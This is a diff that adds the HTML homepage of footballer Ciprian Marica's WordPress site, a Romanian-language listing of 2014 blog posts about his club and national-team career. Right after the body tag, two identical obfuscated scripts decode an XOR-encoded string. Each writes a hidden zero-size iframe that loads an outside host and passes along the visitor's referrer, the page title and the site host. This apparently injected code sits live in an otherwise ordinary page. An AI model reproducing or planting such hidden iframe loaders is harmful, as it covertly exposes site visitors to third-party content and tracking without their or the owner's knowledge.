@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<!--[if IE 7]>
+<html class="ie ie7" lang="ro-RO">
+<![endif]-->
+<!--[if IE 8]>
+<html class="ie ie8" lang="ro-RO">
+<![endif]-->
+<!--[if !(IE 7) | !(IE 8)  ]><!-->
+<html lang="ro-RO">
+<!--<![endif]-->
+<head>
+	<meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+	<meta property="fb:admins" content="1739073979"/>
+	<title>Ciprian Marica</title>
+	<link rel="profile" href="http://gmpg.org/xfn/11">
+	<link rel="pingback" href="https://www.ciprianmarica.com/xmlrpc.php">
+  <script src="https://www.ciprianmarica.com/wp-content/themes/ciprianmarica/js/modernizr.js"></script>
+	<!--[if lt IE 9]>
+	<script src="https://www.ciprianmarica.com/wp-content/themes/ciprianmarica/js/html5.js"></script>
+	<![endif]-->
+	<link rel="alternate" type="application/rss+xml" title="Ciprian Marica &raquo; Feed" href="https://www.ciprianmarica.com/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Ciprian Marica &raquo; Comments Feed" href="https://www.ciprianmarica.com/comments/feed/" />
+<link rel='stylesheet' id='jquery.bxslider-css'  href='http://www.ciprianmarica.com/wp-content/plugins/bxslider-integration/styles/bxslider-integration.css?ver=3.7.27' type='text/css' media='all' />
+<link rel='stylesheet' id='contact-form-7-css'  href='https://www.ciprianmarica.com/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=3.5.4' type='text/css' media='all' />
+<link rel='stylesheet' id='twentythirteen-fonts-css'  href='//fonts.googleapis.com/css?family=Source+Sans+Pro%3A300%2C400%2C700%2C300italic%2C400italic%2C700italic%7CBitter%3A400%2C700&#038;subset=latin%2Clatin-ext' type='text/css' media='all' />
+<link rel='stylesheet' id='genericons-css'  href='https://www.ciprianmarica.com/wp-content/themes/ciprianmarica/fonts/genericons.css?ver=2.09' type='text/css' media='all' />
+<link rel='stylesheet' id='mCustomScrollbar-css'  href='https://www.ciprianmarica.com/wp-content/themes/ciprianmarica/js/scrollbar/jquery.mCustomScrollbar.css?ver=2.09' type='text/css' media='all' />
+<link rel='stylesheet' id='twentythirteen-style-css'  href='https://www.ciprianmarica.com/wp-content/themes/ciprianmarica/style.css?ver=11' type='text/css' media='all' />
+<!--[if lt IE 9]>
+<link rel='stylesheet' id='twentythirteen-ie-css'  href='https://www.ciprianmarica.com/wp-content/themes/ciprianmarica/css/ie.css?ver=2013-07-18' type='text/css' media='all' />
+<![endif]-->
+<link rel='stylesheet' id='pretty-photo-css'  href='https://www.ciprianmarica.com/wp-content/plugins/easy-image-gallery/includes/lib/prettyphoto/prettyPhoto.css?ver=1.0.4' type='text/css' media='screen' />
+<script type='text/javascript' src='https://www.ciprianmarica.com/wp-includes/js/jquery/jquery.js?ver=1.10.2'></script>
+<script type='text/javascript' src='https://www.ciprianmarica.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
+<script type='text/javascript' src='http://www.ciprianmarica.com/wp-content/plugins/bxslider-integration/scripts/jquery.bxslider.min.js?ver=3.7.27'></script>
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.ciprianmarica.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://www.ciprianmarica.com/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 3.7.27" />
+	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+<link rel="alternate" href="https://www.ciprianmarica.com/ro/" hreflang="ro" />
+<link rel="alternate" href="https://www.ciprianmarica.com/en/" hreflang="en" />
+<link rel="alternate" href="https://www.ciprianmarica.com/de/" hreflang="de" />
+<link rel="alternate" href="https://www.ciprianmarica.com/fr/" hreflang="fr" />
+<link rel="alternate" href="https://www.ciprianmarica.com/it/" hreflang="it" />
+
+<script type="text/javascript">
+	var global = {
+		domain_name: 'https://www.ciprianmarica.com'
+	};
+
+	 var _gaq = _gaq || [];
+
+	 _gaq.push(['_setAccount', 'UA-20242847-21']);
+
+	 _gaq.push(['_trackPageview']);
+
+	 (function() {
+
+	   var ga = document.createElement('script'); ga.type =
+
+	'text/javascript'; ga.async = true;
+
+	   ga.src = ('https:' == document.location.protocol ? 'https://ssl' :
+
+	'http://www') + '.google-analytics.com/ga.js';
+
+	   var s = document.getElementsByTagName('script')[0];
+
+	s.parentNode.insertBefore(ga, s);
+
+	 })();
+
+</script>
+
+</head>
+
+
+<body class="home blog">
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+    <!-- Place this tag after the last share tag. -->
+          <script type="text/javascript">
+                  (function() {
+                      var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+                      po.src = 'https://apis.google.com/js/platform.js';
+                      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+                   })();
+          </script>
+          <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+            <div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=582143971875669";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+	<div id="page" class="hfeed site">
+            <div class="search_form" id="search-top-mobile">
+                        
+			<form role="search" method="get" class="search-form" action="https://www.ciprianmarica.com/">
+				<label>
+					<span class="screen-reader-text">Search for:</span>
+					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" title="Search for:" />
+				</label>
+				<input type="submit" class="search-submit" value="Search" />
+			</form>            </div>
+		<!-- LEFT SIDE -->
+		<div class="left">
+			<div class="section blue visible">
+				<div class="wrapper">
+                                     <div class="icon-mobile-menu" id="personal">
+                                     <img src="https://www.ciprianmarica.com/wp-content/themes/ciprianmarica/images/menu-icon-mobile.png"/>
+                                    </div>
+					<a class="logo" href="https://www.ciprianmarica.com/" title="Ciprian Marica" rel="home">
+						<img src="https://www.ciprianmarica.com/wp-content/themes/ciprianmarica/images/section1_logo.png"/>
+					</a>
+										<div class="menu-menu_site-container"><ul id="menu-menu_site" class="menu_site"><li id="menu-item-47" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-47"><a href="https://www.ciprianmarica.com/category/site/events/">Evenimente</a></li>
+<li id="menu-item-48" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-48"><a href="https://www.ciprianmarica.com/category/site/lifestyle/">Lifestyle</a></li>
+<li id="menu-item-42" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-42"><a href="https://www.ciprianmarica.com/biografie/">Biografie</a></li>
+<li id="menu-item-157" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-157"><a href="https://www.ciprianmarica.com/palmares/">Palmares</a></li>
+<li id="menu-item-45" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-45"><a href="https://www.ciprianmarica.com/galerie-media/">Galerie Media</a></li>
+<li id="menu-item-44" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-44"><a href="https://www.ciprianmarica.com/fan-zone/">Fan zone</a></li>
+<li id="menu-item-287" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-287"><a href="https://www.ciprianmarica.com/contact/">Contact</a></li>
+</ul></div>				</div>
+				<div class="handle">
+                                         <div class="icon-mobile-menu" id="foundation">
+                                            <img src="https://www.ciprianmarica.com/wp-content/themes/ciprianmarica/images/menu-icon-mobile.png"/>
+                                        </div>
+					<div class="icon">
+						<img src="https://www.ciprianmarica.com/wp-content/themes/ciprianmarica/images/section1_icon.png"/>
+					</div>
+					<div class="wrapper">
+						<a id="section1" href="javascript:;" title="Ciprian Marica"><img src="https://www.ciprianmarica.com/wp-content/themes/ciprianmarica/images/section1_handle_logo.png"/></a>
+					</div>
+				</div>
+			</div>
+			<div class="section white hidden">
+				<div class="wrapper">
+					<a class="logo" href="https://www.ciprianmarica.com/" title="Ciprian Marica" rel="home">
+						<img src="https://www.ciprianmarica.com/wp-content/themes/ciprianmarica/images/new-logo-ciprian-marica.png" id="mobile-space"/>
+					</a>
+										<div class="menu-menu_foundation-container"><ul id="menu-menu_foundation" class="menu_foundation"><li id="menu-item-60" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-60"><a href="https://www.ciprianmarica.com/misiunea-fundatiei/">Misiunea Fundatiei</a></li>
+<li id="menu-item-58" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-58"><a href="https://www.ciprianmarica.com/category/foundation/foundation-events/">Evenimente</a></li>
+<li id="menu-item-64" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-64"><a href="https://www.ciprianmarica.com/galerie-foto/">Galerie Foto</a></li>
+<li id="menu-item-61" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-61"><a href="https://www.ciprianmarica.com/contact/">Contact</a></li>
+</ul></div>				</div>
+				<div class="handle">
+                                    <div class="icon-mobile-menu">
+                                     <img src="https://www.ciprianmarica.com/wp-content/themes/ciprianmarica/images/menu-icon-mobile.png"/>
+                                    </div>
+					<div class="icon">
+						<img src="https://www.ciprianmarica.com/wp-content/themes/ciprianmarica/images/section2_icon.png"/>
+					</div>
+					<div class="wrapper">
+                                            <div class="icon-mobile-menu" id="foundation-marica">
+                                             <img src="https://www.ciprianmarica.com/wp-content/themes/ciprianmarica/images/menu-icon-mobile.png"/>
+                                            </div>
+						<a id="section2" href="javascript:;" title="Ciprian Marica Foundation"><img src="https://www.ciprianmarica.com/wp-content/themes/ciprianmarica/images/section2_handle_logo.png"/></a>
+					</div>
+				</div>
+			</div>
+                    <div class="section white hidden hidden-mobile mobile-menu-wrapper">
+				<div class="wrapper">
+					<a class="logo" href="https://www.ciprianmarica.com/" title="Ciprian Marica" rel="home">
+						<img src="https://www.ciprianmarica.com/wp-content/themes/ciprianmarica/images/section2_logo.png" id="mobile-space"/>
+					</a>
+										<div class="menu-menu_foundation-container"><ul id="menu-menu_foundation-1" class="menu_foundation"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-60"><a href="https://www.ciprianmarica.com/misiunea-fundatiei/">Misiunea Fundatiei</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-58"><a href="https://www.ciprianmarica.com/category/foundation/foundation-events/">Evenimente</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-64"><a href="https://www.ciprianmarica.com/galerie-foto/">Galerie Foto</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-61"><a href="https://www.ciprianmarica.com/contact/">Contact</a></li>
+</ul></div>				</div>
+				<div class="handle">
+                                    <div class="icon-mobile-menu">
+                                     <img src="https://www.ciprianmarica.com/wp-content/themes/ciprianmarica/images/menu-icon-mobile.png"/>
+                                    </div>
+					<div class="icon">
+						<img src="https://www.ciprianmarica.com/wp-content/themes/ciprianmarica/images/section2_icon.png"/>
+					</div>
+					<div class="wrapper">
+                                            <div class="icon-mobile-menu" id="foundation-marica-bottom">
+                                             <img src="https://www.ciprianmarica.com/wp-content/themes/ciprianmarica/images/menu-icon-mobile.png"/>
+                                            </div>
+						<a id="section3" href="javascript:;" title="Ciprian Marica Foundation"><img src="https://www.ciprianmarica.com/wp-content/themes/ciprianmarica/images/section1_handle_logo.png"/></a>
+					</div>
+				</div>
+			</div>
+                   
+		</div>
+               
+		<div id="main" class="right">
+                     <div class="search_form">
+					<form role="search" method="get" class="search-form" action="https://www.ciprianmarica.com/">
+				<label>
+					<span class="screen-reader-text">Search for:</span>
+					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" title="Search for:" />
+				</label>
+				<input type="submit" class="search-submit" value="Search" />
+			</form>				</div>
+  
+
+	<div id="primary" class="article-list">
+		<div id="content" class="wrapper" role="main">
+			<div class="wrapper_mouse_scroll">
+			<div class="thumbs">
+
+			
+													<article id="post-417" class="post-417 post type-post status-publish format-standard hentry category-events category-site tag-campionatul-european-2016 tag-konyaspor tag-nationala-romaniei" class="categ_articles_listed">
+    <a class="wrapper" href="https://www.ciprianmarica.com/100-sunt-apt-pentru-finlanda/" rel="bookmark" title="&#8220;100% sunt apt pentru Finlanda!&#8221;" >
+        
+        <h2 class="entry-title">
+            &#8220;100% sunt apt pentru Fi ...        </h2>
+
+        <span class="timestamp">
+            01-10-2014             
+                                </span>
+
+                    <img width="303" height="419" src="http://www.ciprianmarica.com/wp-content/uploads/2014/10/fotociprian.jpg" class="attachment-post-thumbnail wp-post-image" alt="fotociprian" />        
+        <span class="excerpt">
+            
+            Astăzi am acordat un interviu exclusiv pentru site! Iată ce am avut de zis! Ciprian, cum te s ...        </span>
+
+    </a>
+</article><!-- #post -->
+									<article id="post-363" class="post-363 post type-post status-publish format-standard hentry category-events category-site tag-ciprian-marica tag-konyaspor tag-stadium" class="categ_articles_listed">
+    <a class="wrapper" href="https://www.ciprianmarica.com/un-salut-din-konya/" rel="bookmark" title="Salutări din Konya" >
+        
+        <h2 class="entry-title">
+            Salutări din Konya        </h2>
+
+        <span class="timestamp">
+            23-09-2014             
+                                </span>
+
+                    <img width="286" height="421" src="http://www.ciprianmarica.com/wp-content/uploads/2014/09/sept.jpg" class="attachment-post-thumbnail wp-post-image" alt="sept" />        
+        <span class="excerpt">
+            
+            Dragi prieteni, de pe stadionul echipei Konyaspor, vă doresc să aveţi o zi minunată! Chiar  ...        </span>
+
+    </a>
+</article><!-- #post -->
+									<article id="post-370" class="post-370 post type-post status-publish format-standard hentry category-events category-site tag-greseli-gramaticale tag-marcel-raducanu tag-polemica" class="categ_articles_listed">
+    <a class="wrapper" href="https://www.ciprianmarica.com/un-raspuns-public/" rel="bookmark" title="Un răspuns public!" >
+        
+        <h2 class="entry-title">
+            Un răspuns public!        </h2>
+
+        <span class="timestamp">
+            19-09-2014             
+                                </span>
+
+                    <img width="238" height="422" src="http://www.ciprianmarica.com/wp-content/uploads/2014/09/marcelr.jpg" class="attachment-post-thumbnail wp-post-image" alt="marcelr" />        
+        <span class="excerpt">
+            
+            Domnule Marcel Răducanu, vă mulțumesc că v-ați făcut timp să îmi scrieți. Eu am ales s ...        </span>
+
+    </a>
+</article><!-- #post -->
+									<article id="post-373" class="post-373 post type-post status-publish format-standard hentry category-events category-site tag-nationala-romaniei tag-turneul-final-al-campionatului-european-de-fotbal-din-2020" class="categ_articles_listed">
+    <a class="wrapper" href="https://www.ciprianmarica.com/gazde-la-euro-2020/" rel="bookmark" title="Gazde la EURO 2020" >
+        
+        <h2 class="entry-title">
+            Gazde la EURO 2020        </h2>
+
+        <span class="timestamp">
+            19-09-2014             
+                                </span>
+
+                    <img width="303" height="419" src="http://www.ciprianmarica.com/wp-content/uploads/2014/09/10423642_720073361373755_5815520274657682594_n.jpg" class="attachment-post-thumbnail wp-post-image" alt="varf" />        
+        <span class="excerpt">
+            
+            Este o mare realizare pentru România, pentru tot ce înseamnă ţara noastră, această decizi ...        </span>
+
+    </a>
+</article><!-- #post -->
+									<article id="post-376" class="post-376 post type-post status-publish format-standard hentry category-events category-site tag-control-medical tag-germania" class="categ_articles_listed">
+    <a class="wrapper" href="https://www.ciprianmarica.com/am-scapat-de-operatie/" rel="bookmark" title="Am scăpat de operaţie" >
+        
+        <h2 class="entry-title">
+            Am scăpat de operaţie        </h2>
+
+        <span class="timestamp">
+            15-09-2014             
+                                </span>
+
+                    <img width="282" height="420" src="http://www.ciprianmarica.com/wp-content/uploads/2014/09/sprint1.jpg" class="attachment-post-thumbnail wp-post-image" alt="sprint1" />        
+        <span class="excerpt">
+            
+            Aşa cum v-am promis, revin cu detalii după controlul medical pe care l-am efectuat în German ...        </span>
+
+    </a>
+</article><!-- #post -->
+									<article id="post-379" class="post-379 post type-post status-publish format-standard hentry category-events category-site tag-accidentare tag-examen tag-germania" class="categ_articles_listed">
+    <a class="wrapper" href="https://www.ciprianmarica.com/o-zi-de-13/" rel="bookmark" title="O zi de 13…" >
+        
+        <h2 class="entry-title">
+            O zi de 13…        </h2>
+
+        <span class="timestamp">
+            13-09-2014             
+                                </span>
+
+                    <img width="347" height="422" src="http://www.ciprianmarica.com/wp-content/uploads/2014/09/schalke.jpg" class="attachment-post-thumbnail wp-post-image" alt="În vizită la foştii coechipieri" />        
+        <span class="excerpt">
+            
+            Din păcate, am o veste proastă pentru voi toţi, cei care mă susţineţi mereu, şi la bine, ...        </span>
+
+    </a>
+</article><!-- #post -->
+									<article id="post-352" class="post-352 post type-post status-publish format-standard hentry category-events category-site tag-grecia-romania-0-1 tag-grupa-f tag-preliminariile-euro-2016" class="categ_articles_listed">
+    <a class="wrapper" href="https://www.ciprianmarica.com/milioane-de-romani-fericiti/" rel="bookmark" title="Milioane de români fericiți!" >
+        
+        <h2 class="entry-title">
+            Milioane de români fericiți!        </h2>
+
+        <span class="timestamp">
+            08-09-2014             
+                                </span>
+
+                    <img width="280" height="420" src="http://www.ciprianmarica.com/wp-content/uploads/2014/09/ciprian.jpg" class="attachment-post-thumbnail wp-post-image" alt="ciprian" />        
+        <span class="excerpt">
+            
+            Prieteni, aseară am reușit să trecem cu bine peste cel mai greu test al acestor preliminarii ...        </span>
+
+    </a>
+</article><!-- #post -->
+									<article id="post-388" class="post-388 post type-post status-publish format-standard hentry category-events category-site tag-euro-2016 tag-greece-romania tag-interview-greek-media" class="categ_articles_listed">
+    <a class="wrapper" href="https://www.ciprianmarica.com/interviu-in-presa-greaca-inaintea-meciului/" rel="bookmark" title="Interviu în presa greacă înaintea meciului" >
+        
+        <h2 class="entry-title">
+            Interviu în presa greacă în ...        </h2>
+
+        <span class="timestamp">
+            06-09-2014             
+                                </span>
+
+                    <img width="297" height="420" src="http://www.ciprianmarica.com/wp-content/uploads/2014/09/desen1.jpg" class="attachment-post-thumbnail wp-post-image" alt="desen1" />        
+        <span class="excerpt">
+            
+            În preziua debutului nostru în preliminariile EURO 2016, media din Grecia mi-a solicitat un i ...        </span>
+
+    </a>
+</article><!-- #post -->
+									<article id="post-382" class="post-382 post type-post status-publish format-standard hentry category-events category-site tag-album-de-familie tag-grecia-romania tag-preliminarii-euro-2016" class="categ_articles_listed">
+    <a class="wrapper" href="https://www.ciprianmarica.com/album-de-familie-tricolora/" rel="bookmark" title="Album de familie tricoloră" >
+        
+        <h2 class="entry-title">
+            Album de familie tricoloră        </h2>
+
+        <span class="timestamp">
+            02-09-2014             
+                                </span>
+
+                    <img width="317" height="422" src="http://www.ciprianmarica.com/wp-content/uploads/2014/09/torje-si-panti-bun.jpg" class="attachment-post-thumbnail wp-post-image" alt="Când Pantilimon se uită de jos în sus la Torje!" />        
+        <span class="excerpt">
+            
+            Prieteni, marea familie a tricolorilor a plecat într-o nouă campanie de calificare la un turn ...        </span>
+
+    </a>
+</article><!-- #post -->
+									<article id="post-391" class="post-391 post type-post status-publish format-standard hentry category-events category-site tag-gabi-torje tag-konyaspor tag-startul-campionatului" class="categ_articles_listed">
+    <a class="wrapper" href="https://www.ciprianmarica.com/3-2-1-se-apropie-startul-campionatului/" rel="bookmark" title="3, 2, 1&#8230; se apropie startul campionatului!" >
+        
+        <h2 class="entry-title">
+            3, 2, 1&#8230; se apropie star ...        </h2>
+
+        <span class="timestamp">
+            25-08-2014             
+                                </span>
+
+                    <img width="267" height="420" src="http://www.ciprianmarica.com/wp-content/uploads/2014/08/eusigabi1.jpg" class="attachment-post-thumbnail wp-post-image" alt="eusigabi1" />        
+        <span class="excerpt">
+            
+            It&#8217;s selfie time! Cu Găbiţă în echipă/ Nici de Milan nu mi-e frică! Profit de ocazi ...        </span>
+
+    </a>
+</article><!-- #post -->
+									<article id="post-403" class="post-403 post type-post status-publish format-standard hentry category-events category-site tag-gol tag-konyaspor tag-patrulater-ankara" class="categ_articles_listed">
+    <a class="wrapper" href="https://www.ciprianmarica.com/go-eagles/" rel="bookmark" title="Go Eagles!" >
+        
+        <h2 class="entry-title">
+            Go Eagles!        </h2>
+
+        <span class="timestamp">
+            23-08-2014             
+                                </span>
+
+                    <img width="309" height="420" src="http://www.ciprianmarica.com/wp-content/uploads/2014/08/goeagles1.jpg" class="attachment-post-thumbnail wp-post-image" alt="goeagles1" />        
+        <span class="excerpt">
+            
+            Gol decisiv şi victorie! Am marcat golul decisiv în meciul amical cîştigat de Konyaspor  c ...        </span>
+
+    </a>
+</article><!-- #post -->
+									<article id="post-406" class="post-406 post type-post status-publish format-standard hentry category-events category-site tag-contract tag-konzaspor" class="categ_articles_listed">
+    <a class="wrapper" href="https://www.ciprianmarica.com/la-konya/" rel="bookmark" title="La Konya!" >
+        
+        <h2 class="entry-title">
+            La Konya!        </h2>
+
+        <span class="timestamp">
+            20-07-2014             
+                                </span>
+
+                    <img width="371" height="420" src="http://www.ciprianmarica.com/wp-content/uploads/2014/07/semnare1.jpg" class="attachment-post-thumbnail wp-post-image" alt="semnare1" />        
+        <span class="excerpt">
+            
+            Am ajuns la Konya să văd despre ce este vorba, să discutăm despre oferta lor. Mi-au spus c� ...        </span>
+
+    </a>
+</article><!-- #post -->
+									<article id="post-347" class="post-347 post type-post status-publish format-standard hentry category-events category-site tag-brazilia tag-campionatul-mondial-2014 tag-ciprian-marica" class="categ_articles_listed">
+    <a class="wrapper" href="https://www.ciprianmarica.com/visul-meu-din-copilarie/" rel="bookmark" title="Visul meu din copilărie!" >
+        
+        <h2 class="entry-title">
+            Visul meu din copilărie!        </h2>
+
+        <span class="timestamp">
+            25-06-2014             
+                                </span>
+
+                    <img width="320" height="420" src="http://www.ciprianmarica.com/wp-content/uploads/2013/12/biografie1-e1387190189265.png" class="attachment-post-thumbnail wp-post-image" alt="Biografie" />        
+        <span class="excerpt">
+            
+            În toiul competiției din Brazilia, vreau să vă spun că vă înțeleg frustrarea că Român ...        </span>
+
+    </a>
+</article><!-- #post -->
+									<article id="post-339" class="post-339 post type-post status-publish format-standard hentry category-uncategorized" class="categ_articles_listed">
+    <a class="wrapper" href="https://www.ciprianmarica.com/hai-simona-hai-romania-2/" rel="bookmark" title="Hai Simona, hai România!" >
+        
+        <h2 class="entry-title">
+            Hai Simona, hai România!        </h2>
+
+        <span class="timestamp">
+            05-06-2014             
+                                </span>
+
+                    <img width="280" height="420" src="http://www.ciprianmarica.com/wp-content/uploads/2014/06/ciprian.jpg" class="attachment-post-thumbnail wp-post-image" alt="ciprian" />        
+        <span class="excerpt">
+            
+            Nationala de fotbal o saluta pe cea mai valoroasa jucatoare de tenis a romanilor!        </span>
+
+    </a>
+</article><!-- #post -->
+									<article id="post-334" class="post-334 post type-post status-publish format-standard hentry category-events category-site tag-ciprian-marica tag-getafe tag-ultima-etapa" class="categ_articles_listed">
+    <a class="wrapper" href="https://www.ciprianmarica.com/daaaaaaa/" rel="bookmark" title="DAAAAAAA!" >
+        
+        <h2 class="entry-title">
+            DAAAAAAA!        </h2>
+
+        <span class="timestamp">
+            19-05-2014             
+                                </span>
+
+                    <img width="320" height="420" src="http://www.ciprianmarica.com/wp-content/uploads/2014/05/marica2.jpg" class="attachment-post-thumbnail wp-post-image" alt="marica2" />        
+        <span class="excerpt">
+            
+            A fost o seară de neuitat! Se încheie astfel un sezon greu, în care am suferit mult. Mulțum ...        </span>
+
+    </a>
+</article><!-- #post -->
+				
+					<nav class="navigation paging-navigation" role="navigation">
+		<h1 class="screen-reader-text">Posts navigation</h1>
+		<div class="nav-links">
+
+						<div class="nav-previous"><a href="https://www.ciprianmarica.com/ro/page/2/" ><span class="meta-nav">&larr;</span> Older posts</a></div>
+			
+			
+		</div><!-- .nav-links -->
+	</nav><!-- .navigation -->
+	
+			
+			</div>
+			</div>
+		</div><!-- #content -->
+	</div><!-- #primary -->
+
+			<div class="footer_area">
+				<div class="top"></div>
+				<a class="button" href="http://www.youtube.com/channel/HCeCeZjAf2-0U"><img src="https://www.ciprianmarica.com/wp-content/themes/ciprianmarica/images/fbtn_y.png"/></a>
+				<a class="button" href="https://twitter.com/ciprian_marica"><img src="https://www.ciprianmarica.com/wp-content/themes/ciprianmarica/images/fbtn_t.png"/></a>
+				<a class="button" href="https://www.facebook.com/ciprianmaricaofficial"><img src="https://www.ciprianmarica.com/wp-content/themes/ciprianmarica/images/fbtn_f.png"/></a>
+				
+
+				<script type="text/javascript">
+				//<![CDATA[
+				if (typeof newsletter_check !== "function") {
+				window.newsletter_check = function (f) {
+				    var re = /^([a-zA-Z0-9_\.\-\+])+\@(([a-zA-Z0-9\-]{1,})+\.)+([a-zA-Z0-9]{2,})+$/;
+				    if (!re.test(f.elements["ne"].value)) {
+				        alert("The email is not correct");
+				        return false;
+				    }
+				    if (f.elements["ny"] && !f.elements["ny"].checked) {
+				        alert("You must accept the privacy statement");
+				        return false;
+				    }
+				    return true;
+				}
+				}
+				//]]>
+				</script>
+
+				<div class="newsletter_form newsletter-subscription">
+					<form method="post" action="http://localhost/ciprianmarica/wp-content/plugins/newsletter/do/subscribe.php" onsubmit="return newsletter_check(this)">
+						<input class="newsletter-email" type="email" name="ne" size="30" required placeholder="Newsletter ...">
+						<input class="newsletter-submit" type="submit" value="Abonare"/>
+					</form>
+				</div>
+
+			</div>
+
+		</div><!-- #main -->
+
+		<div class="bottom_area">
+<!--			<a class="logo_frank" href="http://www.frankgroup.ro/" title="">
+				<img src="https://www.ciprianmarica.com/wp-content/themes/ciprianmarica/images/frank.png" width="74" height="30" />
+			</a>-->
+			&copy; 2018 Ciprian Marica. Toate drepturile rezervate. |
+			<a href="https://www.ciprianmarica.com/termeni-si-conditii/">Terms &amp; conditions</a>
+					</div>
+
+		
+	</div><!-- #page -->
+
+	<script type='text/javascript' src='https://www.ciprianmarica.com/wp-content/plugins/contact-form-7/includes/js/jquery.form.min.js?ver=3.45.0-2013.10.17'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var _wpcf7 = {"loaderUrl":"https:\/\/www.ciprianmarica.com\/wp-content\/plugins\/contact-form-7\/images\/ajax-loader.gif","sending":"\u00cen curs de trimitere..."};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://www.ciprianmarica.com/wp-content/plugins/contact-form-7/includes/js/scripts.js?ver=3.5.4'></script>
